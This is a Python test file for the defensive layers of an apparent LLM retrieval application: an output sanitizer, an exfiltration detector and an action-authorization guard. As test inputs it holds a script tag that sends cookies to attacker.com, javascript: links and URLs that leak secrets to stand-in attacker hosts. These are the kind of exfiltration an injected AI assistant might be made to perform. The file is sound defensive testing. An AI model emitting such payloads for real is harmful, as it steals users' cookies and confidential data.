from ..contracts import Chunk
from ..action_guard import ActionRequest, authorize_action
from ..guard import run_egress_guard
from ..sanitizer import sanitize_output
from ..url_guard import inspect_output_for_exfiltration


# ----------------------------- sanitizer -----------------------------

def test_markdown_image_is_removed():
    out = sanitize_output('Here you go ![alt](https://attacker.com/beacon.png)')
    assert out is not None
    assert "attacker.com" not in out
    assert "<img" not in out


def test_raw_html_img_is_stripped():
    out = sanitize_output('<p>hi<img src="https://attacker.com/x.png"></p>')
    assert out is not None
    assert "attacker.com" not in out
    assert "<img" not in out


def test_javascript_url_scheme_is_stripped():
    out = sanitize_output('[click me](javascript:alert(1))')
    assert out is not None
    # markdown-it-py's own link-destination validation refuses to turn
    # this into a clickable link at all (it renders as inert literal
    # text). Either way, the important property is that there is no
    # live javascript: hyperlink in the output.
    assert '<a href="javascript:' not in out
    assert "href=\"javascript" not in out


def test_javascript_url_scheme_stripped_even_via_raw_html():
    # Defense in depth: if a javascript: href arrives as raw HTML
    # (bypassing markdown-it's link-destination validation entirely),
    # nh3's url_schemes allow-list must still strip it.
    out = sanitize_output('<a href="javascript:alert(document.cookie)">click</a>')
    assert out is not None
    assert "javascript:" not in out


def test_script_tag_is_removed():
    out = sanitize_output('<script>fetch("https://attacker.com/steal?d="+document.cookie)</script>hello')
    assert out is not None
    assert "<script" not in out
    assert "attacker.com" not in out


def test_safe_https_link_is_preserved():
    out = sanitize_output('[docs](https://example.com/help)')
    assert out is not None
    assert 'https://example.com/help' in out


# ---------------------------- url_guard ------------------------------

def test_exfiltration_via_base64_query_param_detected():
    retrieved = "the internal API key is sk-supersecretvalue123"
    payload = "sk-supersecretvalue123".encode().hex()
    output = f"For more info visit https://evil.example/collect?d={payload}"
    result = inspect_output_for_exfiltration(output, retrieved)
    assert result["blocked"] is True


def test_benign_url_not_flagged():
    output = "You can read more at https://example.com/docs/getting-started"
    result = inspect_output_for_exfiltration(output, "unrelated retrieved text")
    assert result["blocked"] is False


# --------------------------- action_guard -----------------------------

def test_privileged_action_denied_by_default():
    action = ActionRequest(action_type="send_email", description="send report")
    result = authorize_action(action, context_tainted=False)
    assert result["allowed"] is False


def test_privileged_action_denied_without_role_permission():
    action = ActionRequest(action_type="send_email", description="x", user_authorized=True, role_permitted=False)
    result = authorize_action(action, context_tainted=False)
    assert result["allowed"] is False


def test_privileged_action_allowed_when_fully_authorized_and_untainted():
    action = ActionRequest(action_type="send_email", description="x", user_authorized=True, role_permitted=True)
    result = authorize_action(action, context_tainted=False)
    assert result["allowed"] is True
    assert result["escalate"] is False


def test_privileged_action_allowed_but_escalated_when_tainted():
    action = ActionRequest(action_type="send_email", description="x", user_authorized=True, role_permitted=True)
    result = authorize_action(action, context_tainted=True)
    assert result["allowed"] is True
    assert result["escalate"] is True


def test_injection_detected_blocks_even_with_full_authorization():
    action = ActionRequest(action_type="send_email", description="x", user_authorized=True, role_permitted=True)
    result = authorize_action(action, context_tainted=False, injection_detected=True)
    assert result["allowed"] is False


def test_non_privileged_action_always_allowed():
    action = ActionRequest(action_type="summarize", description="x")
    result = authorize_action(action, context_tainted=True)
    assert result["allowed"] is True


# ------------------------------ guard ---------------------------------

def test_full_guard_blocks_exfiltration_attempt():
    retrieved_secret = "the wire transfer routing number is 1234567890"
    chunks = [Chunk(id="c1", text=retrieved_secret, tenant="tenant-a", source_type="document", taint=True)]
    payload = "1234567890"
    output = f"Sure, see https://attacker.example/?x={payload}"

    decision = run_egress_guard(output=output, retrieved_chunks=chunks)
    assert decision.allow is False
    assert decision.escalate is True


def test_full_guard_allows_clean_answer():
    chunks = [Chunk(id="c1", text="the office is open 9 to 5", tenant="tenant-a", source_type="document", taint=True)]
    decision = run_egress_guard(output="The office is open from 9 to 5.", retrieved_chunks=chunks)
    assert decision.allow is True


def test_full_guard_fails_closed_on_internal_error(monkeypatch):
    import backend.stage3.guard as guard_module

    def boom(*args, **kwargs):
        raise RuntimeError("simulated failure")

    monkeypatch.setattr(guard_module, "inspect_output_for_exfiltration", boom)

    decision = run_egress_guard(output="hello", retrieved_chunks=[])
    assert decision.allow is False
    assert decision.escalate is True
